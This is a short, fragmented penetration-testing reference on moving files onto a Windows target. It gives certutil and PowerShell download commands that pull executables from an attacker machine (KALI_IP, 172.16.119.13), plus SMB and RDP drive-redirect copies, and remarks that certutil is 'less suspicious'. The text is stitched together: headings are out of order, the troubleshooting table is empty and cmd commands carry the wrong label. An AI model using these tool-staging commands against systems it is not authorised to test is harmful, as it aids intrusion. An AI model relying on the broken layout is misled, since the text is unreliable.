## Hash a Windows file with the built-in utility

**Run in:** Windows cmd.exe. **Requires:** A readable local file and the Windows certutil implementation.

```console
certutil -hashfile C:\Users\Public\file.bin SHA256
```

**What the result establishes:** After a transfer or decoding operation, inspect the file type, size and digest rather than relying only on a completion message.

**Next check:** Confirm the exact source and destination bytes; retry the transfer rather than executing a corrupted or substituted file.

## Commands

**Windows cmd.exe**

```bash
certutil.exe -urlcache -split -f http://KALI_IP:8000/file.exe C:\Users\Public\file.exe
```

## If it fails

| Symptom | Check |

### Downloading TO a Windows target

**Pivoting and File Transfer: Field Reference**

```powershell
# PowerShell
Invoke-WebRequest http://172.16.119.13:8080/tool.exe -OutFile C:\Users\Public\tool.exe
# certutil (lives on every Windows box, less suspicious filename-wise)
certutil -urlcache -split -f http://172.16.119.13:8080/tool.exe C:\Users\Public\tool.exe
# SMB (impacket smbserver on a reachable host):
copy \\172.16.119.13\share\tool.exe C:\Users\Public\
# RDP drive redirect — no server at all:
#   xfreerdp3 ... /drive:kali,/home/kali/loot   then inside Windows:
copy \\tsclient\kali\tool.exe C:\Users\Public\
```
